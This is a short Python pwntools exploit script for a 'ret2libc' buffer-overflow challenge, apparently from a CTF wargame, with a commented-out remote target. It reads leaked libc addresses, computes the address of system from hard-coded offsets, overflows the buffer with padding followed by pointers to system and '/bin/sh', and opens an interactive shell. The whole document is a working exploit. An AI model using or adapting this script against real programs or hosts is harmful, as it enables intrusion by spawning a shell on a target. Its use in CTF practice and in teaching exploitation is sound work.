from pwn import *

r = process('./ret2libc')
# r = remote('bamboofox.cs.nctu.edu.tw', 11002)

raw_input()

r.recvuntil('/bin/sh" is ')
sh = int(r.recvline().strip(), 16)

r.recvuntil('puts" is ')
puts = int(r.recvline().strip(), 16)

padding = 'A'*32
base = puts - 0x64da0
system = base + 0x3fe70

payload = ''
payload += padding 
payload += p32(system)
payload += p32(sh)

print payload

r.send(payload)

print "interactive?"

r.interactive()
